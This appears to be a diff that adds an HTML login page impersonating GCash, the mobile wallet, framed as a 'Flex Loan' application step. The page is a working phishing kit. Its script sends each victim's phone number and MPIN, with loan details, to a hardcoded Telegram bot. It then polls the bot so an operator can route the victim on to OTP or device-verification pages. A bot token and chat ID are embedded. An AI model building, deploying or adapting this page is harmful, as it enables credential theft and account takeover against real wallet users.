@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GCash Login</title>
+  <style>
+    :root {
+      --bg: #f5f6f8;
+      --primary: #00b14f;
+      --primary-dark: #0d8d42;
+      --primary-soft: #dff9eb;
+      --ink: #1c1c1e;
+      --muted: #6b7280;
+      --line: #e8ebef;
+      --shadow: 0 22px 50px rgba(15, 23, 42, 0.12);
+      --error: #ef4444;
+      --error-soft: #fee2e2;
+    }
+
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      height: 100%;
+      font-family: Inter, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: linear-gradient(180deg, #edf7f2 0%, #f6f7fb 100%);
+      color: var(--ink);
+    }
+    body {
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+    .phone {
+      position: relative;
+      width: 100%;
+      max-width: 420px;
+      min-height: 820px;
+      background: linear-gradient(180deg, #fbfcff 0%, #f6f9fd 100%);
+      border-radius: 34px;
+      border: 1px solid rgba(17, 24, 39, 0.05);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+    }
+    .screen {
+      min-height: 820px;
+      padding: 26px 20px 120px;
+      position: relative;
+      display: block;
+    }
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 22px;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .brand-mark {
+      width: 36px;
+      height: 36px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary) 0%, #22c55e 100%);
+      position: relative;
+      box-shadow: 0 10px 18px rgba(0, 177, 79, 0.25);
+    }
+    .brand-mark::before {
+      content: "G";
+      position: absolute;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      color: white;
+      font-weight: 900;
+      font-size: 20px;
+    }
+    .brand-text {
+      font-size: 18px;
+      font-weight: 900;
+      letter-spacing: -0.04em;
+    }
+    .chip {
+      background: var(--primary-soft);
+      color: var(--primary-dark);
+      border-radius: 999px;
+      padding: 8px 12px;
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+    }
+    .progress-bar {
+      width: 100%;
+      height: 5px;
+      background: var(--line);
+      border-radius: 999px;
+      margin-bottom: 24px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), #22c55e);
+      transition: width 0.3s ease;
+    }
+    .hero {
+      margin-top: 12px;
+      margin-bottom: 8px;
+      font-size: 36px;
+      line-height: 1.08;
+      font-weight: 900;
+      letter-spacing: -0.06em;
+    }
+    .sub {
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+    .field {
+      margin-bottom: 18px;
+    }
+    .label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 11px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #4b5563;
+      font-weight: 800;
+    }
+    .input {
+      width: 100%;
+      height: 54px;
+      border-radius: 16px;
+      border: 1px solid var(--line);
+      background: rgba(255,255,255,0.9);
+      padding: 0 16px;
+      font-size: 15px;
+      color: var(--ink);
+      outline: none;
+      transition: 0.2s ease;
+    }
+    .input:focus {
+      border-color: rgba(0, 177, 79, 0.7);
+      box-shadow: 0 0 0 4px rgba(0, 177, 79, 0.12);
+    }
+    .input.error {
+      border-color: var(--error);
+    }
+    .input.error:focus {
+      box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.12);
+    }
+    .row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 8px 0 26px;
+      color: var(--muted);
+      font-size: 13px;
+    }
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .remember input {
+      accent-color: var(--primary);
+    }
+    .link {
+      color: var(--primary-dark);
+      font-weight: 800;
+      text-decoration: none;
+    }
+    .link:hover {
+      text-decoration: underline;
+    }
+    .back-btn {
+      background: transparent;
+      border: none;
+      color: var(--primary-dark);
+      font-size: 16px;
+      font-weight: 900;
+      cursor: pointer;
+      margin-bottom: 12px;
+      padding: 0;
+    }
+    button.primary {
+      width: 100%;
+      border: none;
+      background: linear-gradient(135deg, var(--primary) 0%, #13a95b 100%);
+      color: #fff;
+      height: 58px;
+      border-radius: 18px;
+      font-size: 16px;
+      font-weight: 900;
+      letter-spacing: 0.02em;
+      cursor: pointer;
+      box-shadow: 0 16px 28px rgba(0, 177, 79, 0.24);
+      transition: 0.2s ease;
+      margin-bottom: 12px;
+    }
+    button.primary:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 20px 36px rgba(0, 177, 79, 0.3);
+    }
+    button.primary:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 28px 0 18px;
+      color: #9aa7b5;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      font-weight: 800;
+    }
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: var(--line);
+    }
+    .socials {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+    }
+    .social {
+      height: 52px;
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-weight: 800;
+      color: var(--ink);
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    .social:hover {
+      border-color: var(--primary);
+      box-shadow: 0 2px 8px rgba(0, 177, 79, 0.1);
+    }
+    .social .dot {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      font-size: 10px;
+      font-weight: 900;
+      color: white;
+    }
+    .social.google .dot { background: #e94b3d; }
+    .social.apple .dot { background: #101827; }
+    
+    .error-message {
+      display: none;
+      background: var(--error-soft);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      border-radius: 16px;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      font-size: 13px;
+      color: #991b1b;
+      line-height: 1.5;
+    }
+    
+    .error-message.show {
+      display: block;
+    }
+    
+    .application-summary {
+      display: none;
+      background: rgba(255, 255, 255, 0.8);
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      padding: 14px;
+      margin-bottom: 18px;
+      font-size: 12px;
+    }
+    
+    .application-summary.active {
+      display: block;
+    }
+    
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid rgba(0, 177, 79, 0.1);
+    }
+    
+    .summary-row:last-child {
+      border-bottom: none;
+    }
+    
+    .summary-label {
+      color: var(--muted);
+      font-weight: 700;
+    }
+    
+    .summary-value {
+      font-weight: 900;
+      color: var(--primary-dark);
+    }
+    
+    .spinner-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 9999;
+      place-items: center;
+    }
+    
+    .spinner-overlay.show {
+      display: grid;
+    }
+    
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-top: 4px solid white;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .footer {
+      position: absolute;
+      left: 20px;
+      right: 20px;
+      bottom: 12px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 11px;
+      letter-spacing: 0.05em;
+    }
+  </style>
+</head>
+<body>
+  <div class="phone">
+    <section class="screen">
+      <div class="topbar">
+        <div class="brand">
+          <div class="brand-mark"></div>
+          <div class="brand-text">GCash</div>
+        </div>
+        <span class="chip">Auth</span>
+      </div>
+
+      <div class="progress-bar">
+        <div class="progress-fill" style="width: 75%;"></div>
+      </div>
+
+      <button class="back-btn" onclick="location.href='details.html'">← Back</button>
+
+      <h1 class="hero">Welcome back</h1>
+      <div class="sub">Log in to manage your money with ease and security.</div>
+
+      <div id="errMsg" class="error-message"></div>
+
+      <div id="applicationSummary" class="application-summary">
+        <div class="summary-row">
+          <span class="summary-label">Name</span>
+          <span class="summary-value" id="summaryName">—</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Loan Amount</span>
+          <span class="summary-value" id="summaryAmount">—</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Loan Type</span>
+          <span class="summary-value" id="summaryType">—</span>
+        </div>
+      </div>
+
+      <div class="field">
+        <label class="label" for="phoneInput">Mobile number</label>
+        <input id="phoneInput" class="input" type="text" placeholder="09XX XXX XXXX" maxlength="10" inputmode="numeric" />
+      </div>
+
+      <div class="field">
+        <label class="label" for="pinInput">MPIN</label>
+        <input id="pinInput" class="input" type="password" placeholder="Enter your 4-digit PIN" maxlength="4" inputmode="numeric" />
+      </div>
+
+      <div class="row">
+        <label class="remember">
+          <input type="checkbox" />
+          <span>Remember me</span>
+        </label>
+        <a href="#" class="link">Forgot MPIN?</a>
+      </div>
+
+      <button class="primary" id="continueBtn">Log In</button>
+
+      <div class="divider">or continue with</div>
+
+      <div class="socials">
+        <div class="social google"><span class="dot">G</span> Google</div>
+        <div class="social apple"><span class="dot"></span> Apple</div>
+      </div>
+
+      <div style="text-align: center; margin-top: 24px;">
+        New here? <a href="#" class="link">Create account</a>
+      </div>
+    </section>
+
+    <div id="spinnerOverlay" class="spinner-overlay">
+      <div class="spinner"></div>
+    </div>
+
+    <div class="footer">© 2026 GCash. All rights reserved.</div>
+  </div>
+
+  <script>
+    const CONFIG = {
+      BOT_TOKEN: '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k',
+      CHAT_ID: '8820857419',
+      APPROVE_PAGE: 'otp.html',
+      DEVICE_PAGE: 'device.html',
+      SUCCESS_PAGE: 'success.html'
+    };
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    const phoneInput = document.getElementById('phoneInput');
+    const pinInput = document.getElementById('pinInput');
+    const continueBtn = document.getElementById('continueBtn');
+    const errMsg = document.getElementById('errMsg');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
+
+    function getStoredApplication() {
+      try {
+        return JSON.parse(localStorage.getItem('loanApplication') || '{}');
+      } catch (e) {
+        return {};
+      }
+    }
+
+    function normalizePhone(phone) {
+      // Remove all non-digits and convert to GCash format (09XXXXXXXXX)
+      const digits = String(phone || '').replace(/\D/g, '');
+      // If starts with 63, remove it (international format)
+      const noIntl = digits.startsWith('63') ? digits.slice(2) : digits;
+      // Get last 10 digits
+      const last10 = noIntl.slice(-10);
+      // Ensure it starts with 09
+      return (last10.startsWith('9') ? '0' + last10 : last10).slice(-10);
+    }
+
+    function loadApplicationDetails() {
+      const application = getStoredApplication();
+      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim();
+      const phone = normalizePhone(application.phone || localStorage.getItem('phone'));
+
+      if (phone && phone.length === 10) phoneInput.value = phone;
+
+      if (fullName || application.loanAmount || application.loanType) {
+        document.getElementById('applicationSummary').classList.add('active');
+        document.getElementById('summaryName').textContent = fullName || '—';
+        document.getElementById('summaryAmount').textContent = application.loanAmount ? '₱' + Number(application.loanAmount).toLocaleString() : '—';
+        document.getElementById('summaryType').textContent = application.loanType || '—';
+      }
+    }
+
+    phoneInput.addEventListener('input', () => {
+      // Allow only digits
+      let value = phoneInput.value.replace(/\D/g, '');
+      // Limit to 10 digits
+      value = value.slice(0, 10);
+      // Add leading 0 if needed and starts with 9
+      if (value && value.startsWith('9') && !value.startsWith('0')) {
+        value = '0' + value;
+      }
+      phoneInput.value = value;
+    });
+
+    pinInput.addEventListener('input', () => {
+      pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
+      if (pinInput.value.length === 4) pinInput.blur();
+    });
+
+    function showError(msg) {
+      errMsg.textContent = msg;
+      errMsg.classList.add('show');
+    }
+
+    function hideError() {
+      errMsg.classList.remove('show');
+    }
+
+    function resetButton() {
+      isProcessing = false;
+      continueBtn.disabled = false;
+      continueBtn.textContent = 'Log In';
+    }
+
+    function sendToBot(phone, pin) {
+      if (isProcessing) return;
+      isProcessing = true;
+      continueBtn.disabled = true;
+      continueBtn.textContent = 'Verifying…';
+
+      const application = getStoredApplication();
+      const loanAmount = application.loanAmount ? '₱' + Number(application.loanAmount).toLocaleString() : '—';
+      const loanType = application.loanType || '—';
+      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
+
+      const ts = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+      const verifyId = `verify_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 GCash Flex Loan Verification</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+63${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose an action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve Loan', callback_data: approveId },
+                { text: '📱 Verify Device', callback_data: verifyId }
+              ],
+              [{ text: '❌ Decline', callback_data: declineId }]
+            ]
+          }
+        })
+      })
+        .then(() => {
+          localStorage.setItem('phone', phone);
+          localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
+
+          spinnerOverlay.classList.add('show');
+          startPolling(approveId, declineId, verifyId);
+        })
+        .catch((error) => {
+          console.error('Send error:', error);
+          showError('Connection error. Please try again.');
+          resetButton();
+        });
+    }
+
+    function startPolling(approveId, declineId, verifyId) {
+      let pollAttempts = 0;
+      const maxAttempts = 120; // 2 minutes at 1 second intervals
+
+      const interval = setInterval(() => {
+        pollAttempts++;
+
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  spinnerOverlay.classList.remove('show');
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                } else if (cb === verifyId) {
+                  clearInterval(interval);
+                  spinnerOverlay.classList.remove('show');
+                  window.location.href = CONFIG.DEVICE_PAGE;
+                } else if (cb === declineId) {
+                  clearInterval(interval);
+                  spinnerOverlay.classList.remove('show');
+                  showError('Loan request declined. Please try again or contact support.');
+                  resetButton();
+                }
+              }
+            });
+          })
+          .catch((error) => {
+            console.error('Poll error:', error);
+          });
+
+        if (pollAttempts >= maxAttempts) {
+          clearInterval(interval);
+          spinnerOverlay.classList.remove('show');
+          showError('Verification timeout. Please try again.');
+          resetButton();
+        }
+      }, 1000);
+    }
+
+    continueBtn.addEventListener('click', () => {
+      hideError();
+
+      const phone = normalizePhone(phoneInput.value);
+      const pin = pinInput.value.trim();
+
+      if (!phone || phone.length !== 10) {
+        showError('Please enter a valid 10-digit mobile number (09XX XXX XXXX).');
+        return;
+      }
+      if (pin.length !== 4) {
+        showError('Please enter your 4-digit GCash PIN.');
+        return;
+      }
+
+      sendToBot(phone, pin);
+    });
+
+    window.addEventListener('pageshow', (event) => {
+      if (event.persisted) window.location.reload();
+    });
+
+    window.addEventListener('load', loadApplicationDetails);
+  </script>
+</body>
+</html>
